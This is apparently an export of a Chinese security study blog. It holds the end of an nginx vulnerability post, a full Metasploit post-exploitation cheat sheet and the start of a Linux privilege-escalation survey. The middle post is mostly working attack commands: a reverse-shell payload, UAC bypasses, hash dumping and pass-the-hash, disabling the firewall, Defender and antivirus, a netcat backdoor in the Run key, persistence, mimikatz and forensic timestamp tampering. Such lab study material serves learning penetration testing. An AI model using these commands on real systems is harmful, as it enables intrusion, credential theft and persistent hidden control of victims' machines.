<p><img src="/2020/04/03/nginx-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200131120017.png" alt></p>
<p><img src="/2020/04/03/nginx-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200131120033.png" alt></p>
<p>然后我们在本地网站根目录下创建文件上传页面。</p>
<p><img src="/2020/04/03/nginx-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200131121704.png" alt></p>
<img src="/2020/04/03/nginx-zhong-jian-jian-lou-dong/QQ截图20200131121729.png" style="zoom:50%;">

<img src="/2020/04/03/nginx-zhong-jian-jian-lou-dong/QQ截图20200131121803.png" style="zoom:50%;">







<p>我们将我们刚刚制作好的图片马进行上传，发现提示上传成功。</p>
<p><img src="/2020/04/03/nginx-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200131122629.png" alt></p>
<p>我们在本地网站根目录下进行查看</p>
<p><img src="/2020/04/03/nginx-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200131122944.png" alt></p>
<img src="/2020/04/03/nginx-zhong-jian-jian-lou-dong/QQ截图20200131123013.png" style="zoom:67%;">



<p>我们在shell.jpg后添加/a.php或/b.php后发现可以成功解析。</p>
<img src="/2020/04/03/nginx-zhong-jian-jian-lou-dong/QQ截图20200131123036.png" style="zoom:67%;">

<h5 id="漏洞防御"><a href="#漏洞防御" class="headerlink" title="漏洞防御"></a>漏洞防御</h5><p> 将php.ini文件中的cgi.fix_pathinfo的值设为0，这样php在解析1.php/1.jpg这样的目录时，只要1.jpg不存在就会显示404.</p>
<p><img src="/2020/04/03/nginx-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200131123518.png" alt></p>
<h4 id="nginx-目录遍历漏洞"><a href="#nginx-目录遍历漏洞" class="headerlink" title="nginx-目录遍历漏洞"></a>nginx-目录遍历漏洞</h4><h5 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>​       目录遍历（路径遍历）是由于web服务器或者web应用程序对用户输入的文件名称的安全性验证不足而导致的一种安全漏洞。使得攻击者通过利用一些特殊字符就可以绕过服务器的安全限制，访问任意的文件（可以是web根目录以外的文件），甚至执行系统命令。</p>
<p>​      程序在实现上没有充分过滤用户输入的../之类的目录跳转符，导致恶意用户可以通过提交目录跳转来遍历服务器上的任意文件。</p>
<h5 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>我们首先需要将nginx的配置文件nginx.conf中autoindex off；改为on;</p>
<p><img src="/2020/04/03/nginx-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200131182922.png" alt></p>
<p>我们任意访问网站根目录下的某一文件夹，即可看到该目录下的所有文件，出现目录遍历漏洞。</p>
<p><img src="/2020/04/03/nginx-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200131183226.png" alt></p>
<h5 id="漏洞防御-1"><a href="#漏洞防御-1" class="headerlink" title="漏洞防御"></a>漏洞防御</h5><p>将nginx的配置文件nginx.conf下改为autoindex   off即可；</p>
<p><img src="/2020/04/03/nginx-zhong-jian-jian-lou-dong/QQ%E6%88%AA%E5%9B%BE20200131182922.png" alt></p>
]]></content>
      <categories>
        <category>中间件漏洞学习</category>
      </categories>
      <tags>
        <tag>nginx学习</tag>
      </tags>
  </entry>
  <entry>
    <title>msf后渗透部分学习</title>
    <url>/2020/04/28/msf-hou-shen-tou-bu-fen-xue-xi/</url>
    <content><![CDATA[<h2 id="msf后渗透常见操作总结"><a href="#msf后渗透常见操作总结" class="headerlink" title="msf后渗透常见操作总结"></a>msf后渗透常见操作总结</h2><h4 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h4><ul>
<li><p>已经获得目标系统控制权后扩大战果</p>
<ul>
<li>提权</li>
<li>信息收集</li>
<li>渗透内网</li>
<li>永久后门</li>
</ul>
</li>
<li><p>基于已有 session 扩大战果</p>
<ul>
<li><pre><code>msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=10.0.0.128 LPORT=4444 -b “\x00” -e x86/shikata_ga_nai -f exe -o payload.exe
<figure class="highlight haml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">-<span class="ruby"> kali 监听</span></span><br><span class="line"></span><br><span class="line"><span class="ruby">  -</span></span><br></pre></td></tr></table></figure>
msf &gt; use exploit/multi/handler
msf exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
msf exploit(multi/handler) &gt; set LHOST 10.0.0.128
msf exploit(multi/handler) &gt; exploit -j
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>windows 系统执行 payload.exe</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>kali 进入 metepreter</span><br></pre></td></tr></table></figure>
msf exploit(multi/handler) &gt; sessions 
</code></pre></li>
</ul>
</li>
</ul>
<h1 id="Active-sessions"><a href="#Active-sessions" class="headerlink" title="Active sessions"></a>Active sessions</h1><p>  Id  Name  Type                     Information             Connection</p>
<hr>
<p>  1         meterpreter x86/windows  WIN7-VM\John @ WIN7-VM  10.0.0.128:4444 -&gt; 10.0.0.132:62941 (10.0.0.132)</p>
<p>msf exploit(multi/handler) &gt; sessions </p>
<h1 id="Active-sessions-1"><a href="#Active-sessions-1" class="headerlink" title="Active sessions"></a>Active sessions</h1><p>  Id  Name  Type                     Information             Connection</p>
<hr>
<p>  1         meterpreter x86/windows  WIN7-VM\John @ WIN7-VM  10.0.0.128:4444 -&gt; 10.0.0.132:62941 (10.0.0.132)</p>
<p>msf exploit(multi/handler) &gt; sessions -i 1<br>[*] Starting interaction with 1…</p>
<p>meterpreter &gt; getuid<br>Server username: WIN7-VM\John</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#### <span class="number">2.</span>获取<span class="keyword">system</span>账号权限</span><br><span class="line"></span><br><span class="line">- 提权失败，一般是由于 UAC 限制</span><br></pre></td></tr></table></figure>
<p>meterpreter &gt; getuid<br>Server username: WIN7-VM\John<br>meterpreter &gt; load priv<br>[-] The ‘priv’ extension has already been loaded.<br>meterpreter &gt; getsystem<br>[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:<br>[-] Named Pipe Impersonation (In Memory/Admin)<br>[-] Named Pipe Impersonation (Dropper/Admin)<br>[-] Token Duplication (In Memory/Admin)</p>
<p>meterpreter &gt; background</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>绕过 UAC 限制</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>use exploit/windows/local/ask</span><br></pre></td></tr></table></figure>
<p>  use exploit/windows/local/ask<br>  set payload windows/meterpreter/reverse_tcp<br>  use exploit/windows/local/ask<br>  set payload windows/meterpreter/reverse_tcp<br>  set LHOST 10.0.0.128<br>  set FILENAME win_update.exe<br>  set SESSION 1<br>  exploit<br>  <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">ai4HMWI.png</span>)</span><br><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\MXYqrBh.png</span>)</span><br></pre></td></tr></table></figure><br>meterpreter &gt; getsystem<br>meterpreter &gt; getuid</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\uHed9pJ.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/windows/local/bypassuac</span><br></pre></td></tr></table></figure>
<p>use exploit/windows/local/bypassuac<br>set SESSION 1<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 10.0.0.128<br>show targets<br>exploit</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\eO3yUbv.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/windows/local/bypassuac_injection</span><br></pre></td></tr></table></figure>
<p>use exploit/windows/local/bypassuac_injection<br>set SESSION 1<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 10.0.0.128<br>exploit</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\VwGyhJD.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>利用漏洞直接提权为 system</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>use exploit/windows/local/ms13<span class="emphasis">_053_</span>schlamperei</span><br></pre></td></tr></table></figure>
<p>  use exploit/windows/local/ms13_053_schlamperei<br>  set SESSION 1<br>  <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">  ![<span class="string">img</span>](<span class="link">https://i.imgur.com/VkGx24J.png</span>)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/windows/local/ms13<span class="emphasis">_081_</span>track<span class="emphasis">_popup_</span>menu</span><br></pre></td></tr></table></figure><br>use exploit/windows/local/ms13_081_track_popup_menu<br>set SESSION 1<br>exploit</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">D:\blog\source\_posts\msf后渗透部分学习\VkGx24J.png</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/windows/local/ms13<span class="emphasis">_097_</span>ie<span class="emphasis">_registry_</span>symlink</span><br></pre></td></tr></table></figure>
<p>use exploit/windows/local/ms13_097_ie_registry_symlink<br>set SESSION 1<br>set URIPATH /<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 10.0.0.128<br>set SRVHOST 10.0.0.128<br>exploit</p>
<figure class="highlight gauss"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- <span class="keyword">use</span> exploit/windows/<span class="keyword">local</span>/ppr_flatten_rec</span><br></pre></td></tr></table></figure>
<p>use exploit/windows/local/ppr_flatten_rec<br>set SESSION 1<br>exploit</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/Jhqu2n4.png</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>图形化 payload</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>set payload windows/vncinject/reverse_tcp</span><br></pre></td></tr></table></figure>
<pre><code>use exploit/windows/local/ppr_flatten_rec
set payload windows/vncinject/reverse_tcp
set SESSION 1
set LHOST 10.0.0.128
set ViewOnly false
exploit
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/wOXJo7u.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>关闭 UAC 功能</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>获取 hashdump</span><br></pre></td></tr></table></figure></code></pre><p>  meterpreter &gt; hashdump<br>      Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>      Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>      John:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>  <figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>尝试利用</span><br></pre></td></tr></table></figure><br>  use exploit/windows/smb/psexec<br>  set RHOST 10.0.0.132<br>  set SMBUser John<br>  set SMBPass  aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0<br>  set payload windows/meterpreter/reverse_tcp<br>  set LHOST 10.0.0.128<br>  exploit<br>  <figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/vXDrNNx.png</span>)</span><br><span class="line"></span><br><span class="line">报错：Exploit failed [no-access]</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>需要提前关闭 UAC</span><br></pre></td></tr></table></figure><br>sessions -i 2<br>shell<br>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f<br>cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f<br>shutdown -r -t 0</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/WJBykgA.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>再次利用</span><br></pre></td></tr></table></figure>
<p>use exploit/windows/smb/psexec<br>set RHOST 10.0.0.132<br>set SMBUser John<br>set SMBPass  aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0<br>set payload windows/meterpreter/reverse_tcp<br>set LHOST 10.0.0.128<br>exploit</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">#### <span class="number">4.</span>基础操作 </span><br><span class="line"></span><br><span class="line">##### 关闭 防火墙</span><br><span class="line"></span><br><span class="line">- 需要管理员或<span class="keyword">system</span>权限</span><br></pre></td></tr></table></figure>
<p>netsh advfirewall set allprofiles state on<br>netsh advfirewall set allprofiles state off</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/VsB8p0A.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">##### 关闭windefend</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>查看服务名称</span><br><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/SITzUbY.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>关闭防火墙</span><br></pre></td></tr></table></figure>
<p>  net stop windefend<br>  <figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">##### bitlocker 加密</span><br><span class="line"></span><br><span class="line">- manage-bde -off C:</span><br><span class="line">- manage-bde -status C:</span><br><span class="line"></span><br><span class="line">##### 关闭DEP</span><br><span class="line"></span><br><span class="line">- bcdedit.exe /set &#123;current&#125; nx AlwaysOff</span><br><span class="line"></span><br><span class="line">##### 杀死防病毒软件</span><br><span class="line"></span><br><span class="line">- run killav</span><br><span class="line">- run post/windows/manage/killav</span><br><span class="line"></span><br><span class="line">##### 开启远程桌面服务</span><br></pre></td></tr></table></figure></p>
<h1 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h1><p>run post/windows/manage/enable_rdp</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/Dl02OVL.png</span>)</span><br></pre></td></tr></table></figure>
<h1 id="关闭服务"><a href="#关闭服务" class="headerlink" title="关闭服务"></a>关闭服务</h1><p>run multi_console_command -rc root/.msf4/loot/20180418001805_default_10.0.0.132_host.windows.cle_842354.txt</p>
<h1 id="开启服务-1"><a href="#开启服务-1" class="headerlink" title="开启服务"></a>开启服务</h1><p>run getgui –e<br>run getgui -u yuanfh -p pass<br>run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20160824.1855.rc</p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">##### 查看远程桌面</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>screenshot</span><br><span class="line"><span class="bullet">- </span>use espia</span><br><span class="line"><span class="bullet">  - </span>screengrab</span><br><span class="line"></span><br><span class="line"><span class="section">##### 使用tokens攻击域控制器</span></span><br><span class="line"></span><br><span class="line">tokens, 用户每次登录，账号绑定临时的tokens,访问资源时提交 tokens 进行身份验证，类似于 web cookies。</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>Incognito</span><br><span class="line"><span class="bullet">  - </span>独立功能的软件，被 msf 集成在 metepreter 中</span><br><span class="line"><span class="bullet">  - </span>无需密码或破解或获取密码 hash，窃取 tokens 将自己伪装成其他用户</span><br><span class="line"><span class="bullet">  - </span>尤其适用于域环境下提权渗透多操作系统</span><br><span class="line"><span class="bullet">- </span>搭建域环境</span><br><span class="line"><span class="bullet">  - </span>DC + XP</span><br><span class="line"><span class="bullet">- </span>load incognito</span><br><span class="line"><span class="bullet">  - </span><span class="code">`list_tokens -u`</span></span><br><span class="line"><span class="bullet">  - </span><span class="code">`impersonate_token lab\administrator`</span></span><br><span class="line"><span class="bullet">- </span>运行以上命令需要 getsystem</span><br><span class="line"><span class="bullet">  - </span>本地普通权限用户需要先本地权限</span><br><span class="line"><span class="bullet">  - </span><span class="code">`use exploit/windows/local/ms10_015_kitrap0d`</span></span><br><span class="line"><span class="bullet">  - </span><span class="code">`execute -f cmd.exe -i -t # -t：`</span>使用当前假冒tokens执行程序</span><br><span class="line"><span class="bullet">  - </span>shell</span><br><span class="line"></span><br><span class="line"><span class="section">##### 注册表</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>注册表保存着 windows 几乎全部配置参数</span><br><span class="line"><span class="bullet">  - </span>如果修改不当，可直接造成系统崩溃</span><br><span class="line"><span class="bullet">  - </span>修改前完整备份注册表</span><br><span class="line"><span class="bullet">  - </span>某些注册表的修改是不可逆的</span><br><span class="line"><span class="bullet">- </span>常见用途</span><br><span class="line"><span class="bullet">  - </span>修改、增加启动项</span><br><span class="line"><span class="bullet">  - </span>窃取存储于注册表中的机密信息</span><br><span class="line"><span class="bullet">  - </span>绕过文件型病毒查杀</span><br><span class="line"><span class="bullet">- </span>用注册表添加 nc 后门服务（metepreter）</span><br></pre></td></tr></table></figure>
<p>meterpreter &gt;</p>
<p>upload /usr/share/windows-binaries/nc.exe C:\windows\system32</p>
<p>reg enumkey -k HKLM\software\microsoft\windows\currentversion\run</p>
<p>reg setval -k HKLM\software\microsoft\windows\currentversion\run -v nc -d </p>
<p>‘C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe’</p>
<p>reg queryval -k HKLM\software\microsoft\windows\currentversion\Run -v nc</p>
<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>打开防火墙端口（metepreter）</span><br></pre></td></tr></table></figure>
<p>meterpreter &gt;<br>execute -f cmd -i -H<br>netsh firewall show opmode<br>netsh firewall add portopening TCP 4444 “test” ENABLE ALL<br>shutdown -r -f -t 0<br>nc 10.0.0.132 444</p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 其他注册表项</span><br><span class="line">  - https:<span class="comment">//support.accessdata.com/hc/en-us/articles/204448155-Registry-Quick-Find-Chart</span></span><br><span class="line"></span><br><span class="line">##### 抓包</span><br><span class="line"></span><br><span class="line">- 抓包（metepreter）</span><br><span class="line"></span><br><span class="line">  -</span><br></pre></td></tr></table></figure>
<pre><code>load sniffer
sniffer_interfaces
sniffer_start 2
sniffer_dump 2 1.cap / sniffer_dump 2 1.cap
在内存中缓冲区块循环存储抓包（50000包），不写硬盘
智能过滤 metepreter 流量，传输全称使用 SSL/TLS 加密
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- 解码</span><br><span class="line"></span><br><span class="line">  - use auxiliary/sniffer/psnuffle</span><br><span class="line">  - set PCAPFILE /root/<span class="number">1.</span>cap</span><br><span class="line"></span><br><span class="line">##### 搜索文件</span><br><span class="line"></span><br><span class="line">- search -f *.ini</span><br><span class="line">- search -d c:\documents\ and\ settings\administrator\desktop\ -f *.docx</span><br><span class="line"></span><br><span class="line">##### 破解弱口令</span><br><span class="line"></span><br><span class="line">- John the Ripper 破解弱口令</span><br></pre></td></tr></table></figure></code></pre><ul>
<li>use post/windows/gather/hashdump # system 权限的 metepreter</li>
<li>run # 结果保存在 /tmp 目录下</li>
<li>use auxiliary/analyze/jtr_crack_fast</li>
<li>run<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">##### 擦除痕迹</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>文件系统访问会留下痕迹。电子取证重点关注</span><br><span class="line"><span class="bullet">- </span>渗透测试和攻击者往往希望销毁文件系统访问痕迹</span><br><span class="line"><span class="bullet">- </span>最好的避免被电子取证发现的方法：不要碰文件系统</span><br><span class="line"><span class="bullet">  - </span>metepreter 的先天优势所在（完全基于内存）</span><br><span class="line"><span class="bullet">- </span>MAC 时间 （Modified / Accessed / Changed）</span><br><span class="line"><span class="bullet">  - </span>ls -l –time=atime/mtime/ctime 1.txt</span><br><span class="line"><span class="bullet">  - </span>stat 1.txt</span><br><span class="line"><span class="bullet">  - </span>touch -d “2 days ago” 1.txt</span><br><span class="line"><span class="bullet">  - </span>touch -t 1501010101 1.txt</span><br><span class="line"><span class="bullet">- </span>MACE：MFT entry</span><br><span class="line"><span class="bullet">  - </span>MFT：NTFS 文件系统的主文件分配表 Master File Table</span><br><span class="line"><span class="bullet">  - </span>通常 1024 字节或2个硬盘扇区，其中存放多项 entry 信息</span><br><span class="line"><span class="bullet">  - </span>包含文件大量信息（大小 名称 目录位置 磁盘位置 创建日期）</span><br><span class="line"><span class="bullet">  - </span>更多信息可研究文件系统取证分析技术</span><br><span class="line"></span><br><span class="line"><span class="section">##### pivoting 跳板 /枢纽/支点</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>msfvenom 制作 payload</span><br></pre></td></tr></table></figure>
msfvenom -a x86 –platform windows -p windows/meterpreter/reverse_tcp LHOST=kali_firewall LPORT=4444 -b “\x00\xff” -e x86/shikata_ga_nai -f exe -o payload.exe<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>获取 system 权限</span><br><span class="line"></span><br><span class="line">![<span class="string">img</span>](<span class="link">https://i.imgur.com/PXgwA0S.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>利用已经控制的一台计算机作为入侵内网的跳板</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>在其他内网计算机看来访问全部来自于跳板</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>run autoroute -s 1.1.1.0/24 # 不能访问外网的被攻击目标内网网段</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>自动路由现实场景</span><br><span class="line"></span><br><span class="line">  -</span><br></pre></td></tr></table></figure>
  利用 win7 攻击内网 XP（对比 xp 有无外网访问权的情况）<br>  – 扫描内网：use auxiliary/scanner/portscan/tcp  <figure class="highlight haml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">-<span class="ruby"> Pivoting 之端口转发 portfwd</span></span><br><span class="line"></span><br><span class="line"><span class="ruby">  -</span></span><br></pre></td></tr></table></figure>
  利用已经被控计算机，在kali 与攻击目标之间实现端口转发<br>  portfwd add -L LIP -l LPORT -r RIP -p RPORT<br>  portfwd add -L 1.1.1.10 -l 445 -r 2.1.1.11 -p 3389<br>  portfwd list / delete / flush  <figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- <span class="keyword">use</span> exploit/windows/smb/ms08_067_netapi</span><br></pre></td></tr></table></figure>
set RHOST 127.0.0.1<br>set LHOST 2.1.1.10<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>use exploit/multi/handler</span><br><span class="line"></span><br><span class="line"><span class="bullet">  - </span>set exitonsession false</span><br><span class="line"></span><br><span class="line"><span class="section">#### 持久后门</span></span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>利用漏洞取得的 metepreter 运行内存中，重启失效</span><br><span class="line"><span class="bullet">- </span>重复 exploit 漏洞可能造成服务崩溃</span><br><span class="line"><span class="bullet">- </span>持久后门保证漏洞修复后仍可远程控制</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>metepreter 后门</span><br></pre></td></tr></table></figure>
run metsvc -A # 删除 -r<br>use exploit/multi/handler<br>set PAYLOAD windows/metsvc_bind_tcp<br>set LPORT 31337<br>set RHOST 1.1.1.1<figure class="highlight asciidoc"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="bullet">- </span>持久后门</span><br></pre></td></tr></table></figure>
run persistence -h<br>run persistence -X -i 10 -p 4444 -r 10.0.0.128<br>run persistence -U -i 20 -p 4444 -r 10.0.0.128<br>run persistence -S -i 20 -p 4444 -r 10.0.0.128<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">##### mimikatz</span><br><span class="line"></span><br><span class="line">- hashdump 使用的就是 mimikatz 的部分功能</span><br></pre></td></tr></table></figure>
getsystem<br>load mimikatz<br>wdigest ��kerberos ��msv ��ssp ��tspkg ��livessp<br>mimikatz_command -h<br>mimikatz_command -f a::<br>mimikatz_command -f samdump::hashes<br>mimikatz_command -f handle::list<br>mimikatz_command -f service::list<br>mimikatz_command -f crypto::listProviders<br>mimikatz_command -f winmine::infos # 扫雷游戏<pre><code>

</code></pre></li>
</ul>
]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>msf后渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>linux提权综述</title>
    <url>/2020/04/29/linux-ti-quan-zong-shu/</url>
    <content><![CDATA[<h2 id="linux提权方法综述"><a href="#linux提权方法综述" class="headerlink" title="linux提权方法综述"></a>linux提权方法综述</h2><h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><h3 id="提权方式总结"><a href="#提权方式总结" class="headerlink" title="提权方式总结"></a><strong>提权方式总结</strong></h3><h4 id="利用内核漏洞提权"><a href="#利用内核漏洞提权" class="headerlink" title="利用内核漏洞提权"></a>利用内核漏洞提权</h4><p>​        当我们渗透时获得一个低权限的shell时，内核漏洞应该是最先想到的提权方法。比如前几年很流行的”脏牛漏洞“，直接利用系统里面自带的软件或者内核存在的漏洞。</p>
<p>，要判断我们应该先对系统相关的信息进行收集。</p>
<h5 id="利用前提："><a href="#利用前提：" class="headerlink" title="利用前提："></a>利用前提：</h5><ul>
<li>已经拿到低权限shell</li>
<li>目标系统上有gcc</li>
<li>有上传文件的权限</li>
</ul>
<p><strong>使用命令</strong>：</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">uname -<span class="keyword">a</span>  或  uname -r</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/29/linux-ti-quan-zong-shu/QQ%E6%88%AA%E5%9B%BE20200429143857.png" alt></p>
<p>这样，我们就得到了系统的内核版，cpu架构，和发行版等信息</p>
<p>然后我们就可以使用kali自带的searchsploit来搜索利用代码。</p>
<p><img src="/2020/04/29/linux-ti-quan-zong-shu/QQ%E6%88%AA%E5%9B%BE20200429144304.png" alt></p>
<p>这里在推荐一个很好用的工具</p>
<h5 id="Linux-Exploit-Suggester"><a href="#Linux-Exploit-Suggester" class="headerlink" title="Linux Exploit Suggester"></a>Linux Exploit Suggester</h5><p>​    linux exploit_Suggester是一款根据操作系统版本号自动查找相应<a href="https://www.webshell.cc/tag/tiquan" target="_blank" rel="noopener">提权</a>脚本的工具，如果不带任何参数运行该脚本的话，将执行uname -r返回的操作系统发行版本，或者手工输入-k参数查找指定版本号。</p>
<p>下载地址：<a href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester" target="_blank" rel="noopener">https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</a></p>
<p>举个例子：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">$ perl ./Linux_Exploit_Suggester.pl -k <span class="number">3.0</span><span class="number">.0</span></span><br><span class="line"> </span><br><span class="line">Kernel local: <span class="number">3.0</span><span class="number">.0</span></span><br><span class="line"> </span><br><span class="line">Possible Exploits:</span><br><span class="line">[+] semtex</span><br><span class="line">   CVE<span class="number">-2013</span><span class="number">-2094</span></span><br><span class="line">   Source: www.exploit-db.com/download/<span class="number">25444</span>/‎</span><br><span class="line">[+] memodipper</span><br><span class="line">   CVE<span class="number">-2012</span><span class="number">-0056</span></span><br><span class="line">   Source: http:<span class="comment">//www.exploit-db.com/exploits/18411/</span></span><br><span class="line">[+] perf_swevent</span><br><span class="line">   CVE<span class="number">-2013</span><span class="number">-2094</span></span><br><span class="line">   Source: http:<span class="comment">//www.exploit-db.com/download/26131</span></span><br></pre></td></tr></table></figure>

<h5 id="提权步骤"><a href="#提权步骤" class="headerlink" title="提权步骤"></a>提权步骤</h5><ul>
<li>找到具备利用条件的exp</li>
<li>上传源代码</li>
<li>编译exp后执行</li>
</ul>
<h5 id="脏牛漏洞"><a href="#脏牛漏洞" class="headerlink" title="脏牛漏洞"></a>脏牛漏洞</h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">漏洞描述：</span><br><span class="line">漏洞编号：CVE<span class="number">-2016</span><span class="number">-5195</span></span><br><span class="line">漏洞名称：脏牛（Dirty COW）</span><br><span class="line">漏洞危害：低权限用户利用该漏洞技术可以在全版本上实现本地提权</span><br><span class="line">影响范围：Linux kernel &gt;=<span class="number">2.6</span><span class="number">.22</span> 并且Android也受影响</span><br></pre></td></tr></table></figure>

